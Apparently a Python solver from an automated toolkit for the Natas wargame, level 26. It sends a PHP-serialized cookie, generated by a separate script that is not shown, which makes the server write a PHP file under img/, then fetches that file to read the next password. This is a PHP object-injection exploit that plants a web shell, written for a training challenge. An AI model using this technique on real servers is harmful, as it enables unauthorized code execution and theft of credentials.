import re
import random
import string
from .base_solver import NatasSolver
from utils.php_runner import run_php_script

class Natas26Solver(NatasSolver):
    def generate_random_name(self):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(8))
        
    def solve(self) -> str:
        try:
            # Generate random name for shell
            random_name = self.generate_random_name()
            
            # Run PHP script to generate serialized cookie
            cookie = run_php_script(
                "payloads/natas26_cookies.php",
                random_name
            )
            if not cookie:
                raise ValueError("Failed to generate cookie from PHP")
                
            # Make initial request to set cookie
            parameters = "?x1=0&y1=0&x2=500&y2=500"
            response = self.make_request(
                cookies={"drawing": cookie}
            )
            
            # Make request with parameters to trigger cookie processing
            response = self.make_request(parameters)
            
            # Request the generated PHP file
            response = self.make_request(f"img/{random_name}.php")
            
            # Get raw password from response and take first instance
            lines = response.text.strip().split('\n')
            password = lines[0].strip()  # Take first line only
            # Verify it's a valid password
            if len(password) == 32:
                print(f"[+] Password found: {password}")
                return password
                
        
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas26: {str(e)}")